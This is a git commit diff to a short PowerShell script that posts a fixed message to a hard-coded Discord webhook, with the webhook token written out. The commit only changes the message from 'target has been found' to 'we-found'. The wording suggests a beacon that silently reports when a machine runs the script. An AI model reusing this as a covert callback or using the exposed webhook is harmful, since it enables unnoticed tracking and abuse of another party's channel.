04d3e853108ff22445c8b2d3112a04bb4b741cc5
lookatmelaw <murtesa991@gmail.com>
2024-12-04 21:25:55 +0300

    Update one.ps1

--- one.ps1
+++ one.ps1
@@ -1,5 +1,5 @@
 $webhookUrl = 'https://discord.com/api/webhooks/1312716594543329310/AESsDL5qvv4f0SIzKBjnUbZtDC-nyv5k4yuMfZIJsbtOLAJGo08MIV-j_PMD1hhjT5SL'
 $payload = @{
-    content = 'target has been found'
+    content = 'we-found'
 } | ConvertTo-Json
 Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload
